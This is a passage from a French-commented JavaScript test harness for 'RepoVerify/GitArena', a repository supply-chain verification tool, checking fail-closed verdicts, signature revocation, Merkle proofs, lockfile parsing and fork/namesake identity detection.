    assert.ok(!code.includes('// FIXME'), `Marqueur interdit // FIXME trouvé dans ${file}`);
    assert.ok(!code.includes('sandbox-demo'), `Marqueur interdit sandbox-demo trouvé dans ${file}`);
    assert.ok(!code.includes('Math.random()'), `Aléatoire non déterministe Math.random() interdit dans ${file}`);
  }
  console.log(`  ✓ TEST-19 Validé : Zéro TODO, zéro simulation, zéro Math.random() sur ${filesToCheck.length} modules.`);
  passedTests++;

  // TEST-20 : I4 — Hors-cache (le test décisif : 0 ALLOW sur dépôts non analysés)
  console.log('[TEST-20] Vérification I4 — Hors-cache (0 ALLOW sur dépôts jamais analysés)...');
  const dbInv = initDatabase();
  const unscannedSample = dbInv.prepare(`
    SELECT r.owner, r.name FROM repositories r
    LEFT JOIN behavioral_facts b ON b.owner = r.owner AND b.name = r.name
    WHERE b.id IS NULL
    LIMIT 100
  `).all();
  assert.ok(unscannedSample.length > 0, 'Échantillon hors-cache non vide requis');
  let unexpectedAllow = 0;
  for (const r of unscannedSample) {
    const behavioral = getCachedBehaviorOrAnalyze(r.owner, r.name);
    const osv = { scanned: false, ref: null };
    const dec = decide({ behavioral, osv, execution: null });
    if (dec.verdict === 'ALLOW') unexpectedAllow++;
  }
  assert.equal(unexpectedAllow, 0, `Fail-open détecté : ${unexpectedAllow}/${unscannedSample.length} dépôts non analysés ont reçu ALLOW`);
  console.log(`  ✓ TEST-20 Validé : 0/${unscannedSample.length} dépôts hors-cache n'a reçu ALLOW.`);
  passedTests++;

  // TEST-21 : I1 — Aucun défaut positif sur entrée vide ou partielle
  console.log('[TEST-21] Vérification I1 — Aucun défaut positif sur entrée vide ou partielle...');
  const probes = [
    {},
    { behavioral: null },
    { osv: null },
    { execution: null },
    { behavioral: {}, osv: {}, execution: {} },
    { behavioral: { scanMode: 'METADATA_ONLY' }, osv: { scanned: false } },
    { behavioral: { scanMode: 'STATIC' }, osv: { scanned: false } }
  ];
  for (const probe of probes) {
    const dec = decide(probe);
    assert.notEqual(dec.verdict, 'ALLOW', `Défaut positif interdit sur ${JSON.stringify(probe)}`);
  }
  assert.equal(evaluatePolicyAction({ verdict: 'INDETERMINATE' }, 'enterprise').action, 'block');
  assert.equal(evaluatePolicyAction({ verdict: 'INDETERMINATE' }, 'community').action, 'warn');
  assert.ok(readFileSync(join(__dirname, '../src/engines/evidence.mjs'), 'utf8').includes('INDETERMINATE'));
  console.log(`  ✓ TEST-21 Validé : 0 défaut positif sur ${probes.length} sondes fail-closed.`);
  passedTests++;

  // TEST-22 : I2 — Fingerprint déterministe et sensible aux mutations
  console.log('[TEST-22] Vérification I2 — Déterminisme et sensibilité aux mutations du fingerprint...');
  const fx = { owner: 'a', name: 'b', commit: 'c1', findings: [], scanMode: 'STATIC' };
  const fxReordered = { scanMode: 'STATIC', findings: [], commit: 'c1', name: 'b', owner: 'a' };
  const fp1 = computeCanonicalFingerprint(fx);
  const fp2 = computeCanonicalFingerprint(fxReordered);
  assert.equal(fp1, fp2, 'Le fingerprint canonique doit être déterministe et indépendant de l\'ordre des clés');
  assert.notEqual(computeCanonicalFingerprint({ ...fx, findings: [{ id: 'X', severity: 'LOW' }] }), fp1, 'Mutation de findings doit muter le hash');
  assert.notEqual(computeCanonicalFingerprint({ ...fx, commit: 'c2' }), fp1, 'Mutation de commit doit muter le hash');
  console.log('  ✓ TEST-22 Validé : Fingerprint déterministe et strictement sensible aux mutations.');
  passedTests++;

  // TEST-23 : I3 — Non auto-certification (SCANNER_REPO_ID)
  console.log('[TEST-23] Vérification I3 — Refus d\'auto-certification...');
  const prevScannerId = process.env.REPOVERIFY_SCANNER_REPO_ID;
  const llamaRepo = dbInv.prepare('SELECT id FROM repositories WHERE full_name = ?').get('ggml-org/llama.cpp');
  try {
    process.env.REPOVERIFY_SCANNER_REPO_ID = String(llamaRepo.id);
    const beforeCount = dbInv.prepare('SELECT COUNT(*) as cnt FROM integrity_signatures WHERE subject_repo_id = ?').get(llamaRepo.id).cnt;
    const selfSignAttempt = await issueIntegritySignature('ggml-org', 'llama.cpp', { includeLiveCi: false });
    assert.equal(selfSignAttempt.ok, false, 'Le scanner ne doit pas pouvoir signer son propre dépôt');
    assert.equal(selfSignAttempt.status, 403);
    const afterCount = dbInv.prepare('SELECT COUNT(*) as cnt FROM integrity_signatures WHERE subject_repo_id = ?').get(llamaRepo.id).cnt;
    assert.equal(afterCount, beforeCount, 'Aucune signature supplémentaire ne doit être persistée pour SCANNER_REPO_ID');
  } finally {
    if (prevScannerId === undefined) delete process.env.REPOVERIFY_SCANNER_REPO_ID;
    else process.env.REPOVERIFY_SCANNER_REPO_ID = prevScannerId;
  }
  console.log('  ✓ TEST-23 Validé : Auto-certification bloquée à l\'émission et absente en base.');
  passedTests++;

  // TEST-24 : I5 — Preuves liées + révocation fail-closed (DB + contrat)
  console.log('[TEST-24] Vérification I5 — Références de preuve & rejet des clés révoquées...');
  const allowRows = dbInv.prepare("SELECT id, evidence_refs_json, keyid FROM integrity_signatures WHERE decision = 'ALLOW'").all();
  for (const row of allowRows) {
    const refs = JSON.parse(row.evidence_refs_json || '[]');
    assert.ok(refs.length > 0, `Signature ${row.id} : ALLOW sans référence de preuve`);
    const revRow = row.keyid ? dbInv.prepare('SELECT 1 FROM revoked_keys WHERE keyid = ?').get(row.keyid) : null;
    assert.equal(Boolean(revRow), false, `Signature ${row.id} émise avec une clé révoquée`);
  }
  assert.equal(verifyIntegritySignature({ keyid: 'inconnu' }).valid, false);
  assert.equal(verifyIntegritySignature({ evidenceRefs: [], verdict: 'ALLOW', payloadJson: '{}', signatureEd25519: 'x', publicKeyPem: 'x' }).valid, false);
  assert.equal(isSignable({ verdict: 'ALLOW', evidenceRefs: [] }), false);
  assert.equal(isSignable({ verdict: 'ALLOW', evidenceRefs: ['behavioral_facts:1'] }), true);

  const testRevokedKey = 'deadbeef00001111';
  revokeKeyId(testRevokedKey, 'unit_test_revocation');
  assert.equal(verifyIntegritySignature({ keyid: testRevokedKey, payloadJson: '{}', signatureEd25519: 'abc', publicKeyPem: 'abc' }).valid, false);
  dbInv.prepare('DELETE FROM revoked_keys WHERE keyid = ?').run(testRevokedKey);
  console.log(`  ✓ TEST-24 Validé : ${allowRows.length} ALLOW en base vérifié(s), preuves exigées et clés révoquées rejetées.`);
  passedTests++;

  // TEST-25 : Recensement honnête (verified <= indexed)
  console.log('[TEST-25] Vérification du Recensement Honnête (verified <= indexed)...');
  const census = getHonestCensus();
  assert.ok(census.indexed >= 200);
  assert.ok(census.verifiedWithEvidence <= census.indexed, 'verifiedWithEvidence ne doit jamais dépasser indexed');
  closeDatabase();
  console.log(`  ✓ TEST-25 Validé : indexés=${census.indexed}, statiques=${census.staticScanned}, vérifiés_avec_preuve=${census.verifiedWithEvidence}.`);
  passedTests++;

  // TEST-26 : Phase II — Merkle SHA-256, Révocation/TTL, Golden Set & Dedupe
  console.log('[TEST-26] Vérification Phase II (Merkle, TTL/Révocation, Golden Set, Corpus Dedupe)...');
  assert.notEqual(leafHash({ a: 1 }), nodeHash('0'.repeat(64), '1'.repeat(64)), 'Séparation de domaine Merkle requise');
  const leaves = [{ repo: 'a/b', verdict: 'INDETERMINATE' }, { repo: 'c/d', verdict: 'DENY' }, { repo: 'e/f', verdict: 'ALLOW' }];
  const tree = buildTree(leaves);
  const proof1 = inclusionProof(tree.levels, 1);
  assert.equal(verifyProof(leaves[1], proof1, tree.root).valid, true, 'Preuve d\'inclusion Merkle doit être valide');
  assert.equal(verifyProof({ ...leaves[1], verdict: 'ALLOW' }, proof1, tree.root).valid, false, 'Feuille altérée doit invalider la preuve Merkle');

  assert.equal(badgeState({ issuedAt: '2026-01-01T00:00:00Z' }, new Date('2026-02-01T00:00:00Z'), { ttlDays: 90, graceDays: 30 }).state, 'live');
  assert.equal(badgeState({ issuedAt: '2026-01-01T00:00:00Z' }, new Date('2026-04-15T00:00:00Z'), { ttlDays: 90, graceDays: 30 }).state, 'stale');
  assert.equal(badgeState({ issuedAt: '2026-01-01T00:00:00Z' }, new Date('2026-06-01T00:00:00Z'), { ttlDays: 90, graceDays: 30 }).state, 'dead');
  assert.equal(badgeState({ issuedAt: '2026-01-01T00:00:00Z', revoked: { reason: 'archived' } }, new Date('2026-01-02T00:00:00Z')).state, 'dead');

  const nonProbant = evaluateGolden([{ trueClass: 'library', softwareScore: 0.9 }], 0.7);
  assert.equal(nonProbant.gate, 'FAIL_JEU_NON_PROBANT');
  assert.equal(nonProbant.fpCert, null);

  const probant200 = Array.from({ length: 200 }, (_, i) => ({
    trueClass: i % 2 === 0 ? 'library' : 'dataset',
    softwareScore: i % 2 === 0 ? 0.9 : 0.3,
    annotated_by: 'human-auditor',
    arbitrated: true
  }));
  const goldenPass = evaluateGolden(probant200, 0.7);
  assert.equal(goldenPass.gate, 'PASS');
  const goldenFail = evaluateGolden([{ trueClass: 'dataset', softwareScore: 0.85, annotated_by: 'human-auditor', arbitrated: true }], 0.7);
  assert.equal(goldenFail.fpCert, 1);
  assert.equal(goldenFail.gate, 'FAIL_FAIL_CLOSED_VIOLE');

  const deduped = dedupe([
    { input: 'go/go', exists: true, id: 100, canonical: 'golang/go', stars: 125000 },
    { input: 'golang/go', exists: true, id: 100, canonical: 'golang/go', stars: 125000 },
    { input: 'fake/ghost', exists: false }
  ]);
  assert.equal(deduped.kept.length, 1);
  assert.equal(deduped.dupes.length, 1);
  assert.equal(deduped.ghosts.length, 1);
  assert.equal(executionVerdict({ isolation: 60, instrumented: true, buildExit: 0 }).evidenceLevel, Evidence.OSV_QUERIED);
  assert.equal(executionVerdict({ isolation: 85, instrumented: true, buildExit: 0 }).evidenceLevel, Evidence.EXECUTED);
  console.log('  ✓ TEST-26 Validé : Merkle SHA-256, Révocation TTL, Golden Set & Dedupe conformes.');
  passedTests++;

  // TEST-27 : Phase III — Lockfiles prioritaires, semver strict, identité, unattempted & Census
  console.log('[TEST-27] Vérification Phase III (Lockfiles, Semver strict, Identité, Attrition & Census)...');
  const extractedStrict = extractDeps({
    'package.json': JSON.stringify({ dependencies: { ranged: '^4.18.2', exactpkg: '1.2.3', star: '*' } }),
    'package-lock.json': JSON.stringify({ packages: { 'node_modules/locked-npm': { version: '2.4.1' } } }),
    'requirements.txt': 'fastapi==0.115.0\nrequests>=2.31.0\n',
    'Cargo.toml': '[dependencies]\nranged_crate = "0.3"\nexact_crate = "1.0.210"\n',
    'Cargo.lock': '[[package]]\nname = "futures"\nversion = "0.3.30"\n',
    'uv.lock': '[[package]]\nname = "uvicorn"\nversion = "0.32.1"\n',
    'go.mod': 'require (\n\tgithub.com/gin-gonic/gin v1.10.0\n)\n'
  });
  assert.ok(extractedStrict.some(d => d.name === 'locked-npm' && d.source === 'package-lock.json'), 'Lockfile npm prioritaire sur package.json');
  assert.equal(extractedStrict.some(d => d.name === 'ranged'), false, 'Plage ^4.18.2 rejetée');
  assert.ok(extractedStrict.some(d => d.name === 'futures' && d.version === '0.3.30'), 'Cargo.lock extrait x.y.z exact');
  assert.equal(extractedStrict.some(d => d.name === 'ranged_crate'), false, 'Plage Cargo 0.3 rejetée');
  assert.ok(extractedStrict.some(d => d.name === 'uvicorn' && d.source === 'uv.lock'), 'uv.lock prioritaire PyPI');
  assert.equal(extractedStrict.some(d => d.name === 'fastapi'), false, 'requirements.txt ignoré si uv.lock PyPI présent');
  assert.ok(extractedStrict.some(d => d.name === 'github.com/gin-gonic/gin' && d.version === '1.10.0'), 'go.mod repli x.y.z');

  const idFork = evaluateIdentity('evil/fork', { id: 999999, fork: true, parent: { full_name: 'org/orig' } }, 'evil/fork');
  assert.equal(idFork.match, false);
  assert.equal(idFork.status, 'FORK');
  const idSquat = evaluateIdentity('qodo-ai/pr-agent', { id: 9999999, fork: false }, 'qodo-ai/pr-agent');
  assert.equal(idSquat.match, false);
  assert.equal(idSquat.status, 'NAMESAKE_OR_FORK');

  assert.equal(scanDirectoryBehavior(join(__dirname, '..', 'src')).scanMode, 'STATIC');
  assert.equal(scanDirectoryBehavior(join(__dirname, '..', 'src')).scanScope, 'local_clone_preflight');

  const tmpIdxDir = mkdtempSync(join(tmpdir(), 'repoverify-p3-'));
  try {
    const idxDb = new DatabaseSync(join(tmpIdxDir, 'p3.sqlite'));
    idxDb.exec(readFileSync(join(__dirname, '../src/db/schema.sql'), 'utf8'));
    idxDb.prepare("INSERT INTO corpus_inputs (input, status, added_at) VALUES ('clean/pkg', 'resolved', '2026-11-17')").run();
    idxDb.prepare("INSERT INTO corpus_inputs (input, status, added_at) VALUES ('nopins/pkg', 'resolved', '2026-11-17')").run();
    idxDb.prepare("INSERT INTO corpus_inputs (input, status, added_at) VALUES ('ghost/pkg', 'ghost_404', '2026-11-17')").run();
    idxDb.prepare("INSERT INTO corpus_inputs (input, status, added_at) VALUES ('todo/pkg', 'pending', '2026-11-17')").run();
    idxDb.prepare('INSERT INTO repos (id, owner, name, full_name, resolved_at) VALUES (?, ?, ?, ?, ?)').run(10, 'clean', 'pkg', 'clean/pkg', '2026-11-17');
    idxDb.prepare('INSERT INTO repos (id, owner, name, full_name, resolved_at) VALUES (?, ?, ?, ?, ?)').run(11, 'nopins', 'pkg', 'nopins/pkg', '2026-11-17');
    idxDb.prepare("INSERT INTO behavioral_facts (owner, name, full_name, scan_mode, scan_scope, ref, findings_json, scanned_at, scanner_version) VALUES ('clean','pkg','clean/pkg','STATIC','raw_manifests','behavioral_facts:1','[]','2026-11-17','v0.6')").run();
    idxDb.prepare("INSERT INTO behavioral_facts (owner, name, full_name, scan_mode, scan_scope, ref, findings_json, scanned_at, scanner_version) VALUES ('nopins','pkg','nopins/pkg','STATIC','no_manifest_found','behavioral_facts:2','[]','2026-11-17','v0.6')").run();
    idxDb.prepare("INSERT INTO osv_queries (owner, name, full_name, ecosystem, packages, vulns_json, queried_at, ref, status, deps_declared, deps_resolved, deps_queried, lockfile_used, coverage_gate) VALUES ('clean','pkg','clean/pkg','npm',1,'[]','2026-11-17','osv:clean/pkg:1','queried',1,1,1,'package-lock.json','PASS')").run();
    idxDb.prepare("INSERT INTO osv_queries (owner, name, full_name, ecosystem, packages, vulns_json, queried_at, ref, status) VALUES ('nopins','pkg','nopins/pkg','none',0,'[]','2026-11-17','osv:nopins/pkg:none','no_pinned_deps')").run();

    const p3Census = computeCensus(idxDb);
    assert.equal(p3Census.inputs, 4);
    assert.equal(p3Census.attempted, 3);
    assert.equal(p3Census.unattempted, 1);
    assert.equal(p3Census.ghosts, 1);
    assert.equal(p3Census.resolved, 2);
    assert.equal(p3Census.staticScanned, 1, 'no_manifest_found ne compte pas comme static_scanned');
    assert.equal(p3Census.osvQueried, 1);
    assert.equal(p3Census.verifiedWithEvidence, 1);
    idxDb.close();
  } finally {
    rmSync(tmpIdxDir, { recursive: true, force: true });
  }
  console.log('  ✓ TEST-27 Validé : Lockfiles, Semver x.y.z, Identité, unattempted & Census conformes.');
  passedTests++;

  // TEST-28 : Phase IV (I6 Complétude, Visibilité OSV, Ancre Registres Indépendants & Cohortes)
  console.log('[TEST-28] Vérification Phase IV (I6 Complétude, Identité Registre & Cohortes)...');
  const covNoLock = assessCoverage({ lockfile: null, deps_declared: 5, deps_resolved: null, deps_queried: 5, transitive: false });
  assert.equal(gateCompleteness(covNoLock).gate, 'NO_LOCKFILE');
  assert.equal(gateCompleteness(covNoLock).cap, 'INDETERMINATE');
  assert.equal(applyCap('ALLOW', gateCompleteness(covNoLock).cap), 'INDETERMINATE');

  const covPartial = assessCoverage({ lockfile: 'Cargo.lock', deps_declared: 10, deps_resolved: 1010, deps_queried: 10, transitive: true });
  assert.equal(gateCompleteness(covPartial).gate, 'INCOMPLETE_QUERY');
  assert.equal(gateCompleteness(covPartial).cap, 'INDETERMINATE');

  const covPass = assessRepo({ lockfileUsed: 'uv.lock', depsDeclared: 14, depsResolved: 168, depsQueried: 168 });
  assert.equal(covPass.gate.gate, 'PASS');
  assert.equal(covPass.gate.cap, 'ALLOW');
  assert.equal(applyCap('ALLOW', covPass.gate.cap), 'ALLOW');

  const vis = visibleAdvisories(
    [{ id: 'RUSTSEC-1', package: 'bincode' }, { id: 'GHSA-2', package: 'pillow' }, { id: 'GHSA-3', package: 'serde' }],
    ['Serde', 'tokio']
  );
  assert.deepEqual(vis.map(v => v.id), ['GHSA-3']);

  assert.equal(cleanGitUrl('git+https://github.com/Codium-ai/pr-agent.git'), 'codium-ai/pr-agent');
  assert.equal(identityVerdict({ url: null, reason: 'registry_http_404' }, { slug: 'a/b', id: 1 }).status, 'UNANCHORED');
  assert.equal(identityVerdict({ url: 'https://github.com/Codium-ai/pr-agent', source: 'pypi.org' }, { slug: 'The-PR-Agent/pr-agent', inputSlug: 'Codium-ai/pr-agent', id: 662766482 }).status, 'REDIRECTED');
  // Fixture délibérée de homonyme / usurpation (NAMESAKE_OR_FORK)
  const namesakeRes = identityVerdict(
    { source: 'pypi.org', url: 'https://github.com/orig-org/authentic-tool' },
    { slug: 'lookalike-actor/authentic-tool', id: 9876543 }
  );
  assert.equal(namesakeRes.status, 'NAMESAKE_OR_FORK');
  assert.equal(namesakeRes.match, false);

  const mockPyPI = await expectedUpstream('demo-pkg', 'PyPI', {
    fetchFn: async () => ({
      ok: true,
      status: 200,
      json: async () => ({ info: { project_urls: { Source: 'https://github.com/real-org/demo-pkg' } } })
    })
  });
  assert.equal(mockPyPI.slug, 'real-org/demo-pkg');
  assert.equal(mockPyPI.source, 'pypi.org');

  const tmpP4Dir = mkdtempSync(join(tmpdir(), 'repoverify-p4-'));
  try {
    const p4Db = new DatabaseSync(join(tmpP4Dir, 'p4.sqlite'));
    p4Db.exec(readFileSync(join(__dirname, '../src/db/schema.sql'), 'utf8'));
    p4Db.prepare("INSERT INTO corpus_inputs (input, status, added_at) VALUES ('nolock/pkg', 'resolved', '2026-11-18')").run();
    p4Db.prepare("INSERT INTO corpus_inputs (input, status, added_at) VALUES ('locked/pkg', 'resolved', '2026-11-18')").run();
    p4Db.prepare('INSERT INTO repos (id, owner, name, full_name, resolved_at) VALUES (?, ?, ?, ?, ?)').run(20, 'nolock', 'pkg', 'nolock/pkg', '2026-11-18');
    p4Db.prepare('INSERT INTO repos (id, owner, name, full_name, resolved_at) VALUES (?, ?, ?, ?, ?)').run(21, 'locked', 'pkg', 'locked/pkg', '2026-11-18');
    p4Db.prepare("INSERT INTO behavioral_facts (owner, name, full_name, scan_mode, scan_scope, ref, findings_json, scanned_at, scanner_version) VALUES ('nolock','pkg','nolock/pkg','STATIC','raw_manifests','behavioral_facts:20','[]','2026-11-18','v0.7')").run();
    p4Db.prepare("INSERT INTO behavioral_facts (owner, name, full_name, scan_mode, scan_scope, ref, findings_json, scanned_at, scanner_version) VALUES ('locked','pkg','locked/pkg','STATIC','raw_manifests','behavioral_facts:21','[]','2026-11-18','v0.7')").run();
    p4Db.prepare("INSERT INTO osv_queries (owner, name, full_name, ecosystem, packages, vulns_json, queried_at, ref, status, deps_declared, deps_resolved, deps_queried, lockfile_used, coverage_gate) VALUES ('nolock','pkg','nolock/pkg','npm',5,'[]','2026-11-18','osv:nolock/pkg:1','queried',5,NULL,5,NULL,'NO_LOCKFILE')").run();
    p4Db.prepare("INSERT INTO osv_queries (owner, name, full_name, ecosystem, packages, vulns_json, queried_at, ref, status, deps_declared, deps_resolved, deps_queried, lockfile_used, coverage_gate) VALUES ('locked','pkg','locked/pkg','PyPI',168,'[]','2026-11-18','osv:locked/pkg:1','queried',14,168,168,'uv.lock','PASS')").run();
    p4Db.prepare("INSERT INTO cohort_members (cohort_id, repo_id, input) VALUES ('cohort-test', 20, 'nolock/pkg'), ('cohort-test', 21, 'locked/pkg')").run();
    p4Db.prepare("INSERT INTO stage_attrition (cohort_id, repo_id, input, from_stage, to_stage, reason) VALUES ('cohort-test', 20, 'nolock/pkg', 'osv', 'verified', 'coverage_gate_NO_LOCKFILE')").run();

    const cohortCensus = computeCensus(p4Db, 'cohort-test');
    assert.equal(cohortCensus.inputs, 2);
    assert.equal(cohortCensus.osvQueried, 2);
    assert.equal(cohortCensus.coveragePass, 1);
    assert.equal(cohortCensus.verifiedWithEvidence, 1, 'NO_LOCKFILE ne doit pas être compté comme vérifié sous I6');
    assert.equal(cohortCensus.attritionEvents, 1);
    p4Db.close();
  } finally {
    rmSync(tmpP4Dir, { recursive: true, force: true });
  }
  console.log('  ✓ TEST-28 Validé : I6 complétude, visibilité OSV, ancre registres, homonymes & cohortes conformes.');
  passedTests++;

  // TEST-29 : Phase V — Profondeur de sonde, I7 somme exacte, Tiers identité, portée déclarative & I8 bande
  console.log('[TEST-29] Vérification Phase V (Probe Depth, I7 Waterfall, Tiers, Scope & I8 Bande)...');
  const locMock = await locateLockfiles('org', 'mono', 'main', async () => ({
    ok: true,
    status: 200,
    json: async () => ({
      truncated: false,
      tree: [
        { type: 'blob', path: 'package.json', size: 800 },
        { type: 'blob', path: 'pnpm-lock.yaml', size: 2240125 },
        { type: 'blob', path: 'web/uv.lock', size: 120000 }
      ]
    })
  }));
  assert.equal(locMock.consulted, true);
  assert.equal(locMock.locks.length, 2);
  assert.equal(locMock.locks[0].path, 'pnpm-lock.yaml');

  const bcOver = blockCause({
    located: locMock,
    read: [],
    skipped: [{ path: 'pnpm-lock.yaml', size: 2240125, reason: 'over_cap' }],
    capBytes: 2_000_000,
  });
  assert.equal(bcOver.cause, 'LOCKFILE_OVER_CAP');
  assert.equal(bcOver.origin, 'probe');
  assert.equal(bcOver.cap, 'INDETERMINATE');
  assert.ok(scopeStatement(bcOver).includes('LOCKFILE_OVER_CAP'));

  const bcEco = blockCause({
    located: { consulted: true, truncated: false, locks: [{ path: 'poetry.lock', size: 412000, depth: 0 }], pinned: [] },
    read: [],
    ecoAllowed: ECO_LOCKS.npm,
  });
  assert.equal(bcEco.cause, 'ECO_LOCK_MISMATCH');
  assert.equal(bcEco.origin, 'probe');

  const bcTrunc = blockCause({ located: { consulted: true, truncated: true, locks: [], pinned: [] } });
  assert.equal(bcTrunc.cause, 'TREE_TRUNCATED');
  assert.equal(bcTrunc.origin, 'probe');

  const bcRepo = blockCause({ located: { consulted: true, truncated: false, locks: [], pinned: [{ path: 'requirements.txt', size: 300 }] }, pinnedAccepted: false });
  assert.equal(bcRepo.cause, 'NO_LOCKFILE');
  assert.equal(bcRepo.origin, 'repo');

  const readUnderCap = await readLocks('org', 'mono', 'main', [{ path: 'pnpm-lock.yaml', size: 2240125 }], 2_000_000, async () => { throw new Error('should not fetch over_cap'); });
  assert.equal(readUnderCap.read.length, 0);
  assert.equal(readUnderCap.skipped[0].reason, 'over_cap');

  const idScope = buildIdentityScope({ status: 'CANONICAL_MATCH' }, { source: 'pypi.org', url: 'https://github.com/the-pr-agent/pr-agent' });
  assert.equal(idScope.anchor_declarative, true);
  assert.ok(idScope.does_not_attest.some(x => x.includes('squat')));

  assert.equal(checkBand(14, { lo: 5, hi: 40 }).within, true);
  assert.equal(checkBand(14, { lo: 5, hi: 40 }).action, 'publish');
  assert.equal(checkBand(120, { lo: 5, hi: 40 }).within, false);
  assert.equal(checkBand(120, { lo: 5, hi: 40 }).action, 'HOLD_suspect_gate');

  const wfCheck = decomposeReasons([
    { findings: 0, vulns: 13 },
    { findings: 1, vulns: 2 },
    { findings: 1, vulns: 0 },
    { findings: 0, vulns: 0 },
  ]);
  assert.equal(wfCheck.exactSum, true);
  assert.equal(wfCheck.passCoverage, 4);
  assert.equal(wfCheck.verifiedAsResolved, 1);

  const dbV5 = initDatabase();
  const realCensus = computeCensus(dbV5);
  assert.equal(realCensus.passBreakdown.exactSum, true, 'Invariant I7 doit être exact sur la vraie base SQLite');
  assert.ok(realCensus.verifiedAsNamed <= realCensus.verifiedAsResolved, 'Tier B (named) <= Tier A (resolved)');
  closeDatabase();

  console.log(`  ✓ TEST-29 Validé : Probe Depth, I7 exact (${realCensus.passBreakdown.blockedFindingsOnly}+${realCensus.passBreakdown.blockedAdvisoriesOnly}+${realCensus.passBreakdown.blockedBoth}+${realCensus.passBreakdown.verifiedAsResolved}=${realCensus.passBreakdown.passCoverage}), Tiers A=${realCensus.verifiedAsResolved}/B=${realCensus.verifiedAsNamed}, Scope & I8 conformes.`);
  passedTests++;

  console.log('\n======================================================');
  console.log(`[HARNESS] ${passedTests}/${totalTests} assertions vérifiées avec succès à 100%.`);
  console.log('[HARNESS] Intégrité de RepoVerify/GitArena scellée. Code de sortie : 0.');
  console.log('======================================================\n');
}

runE2eHarness().catch(err => {
  console.error('\n[HARNESS CRITICAL FAILURE]', err);
  process.exit(1);
});
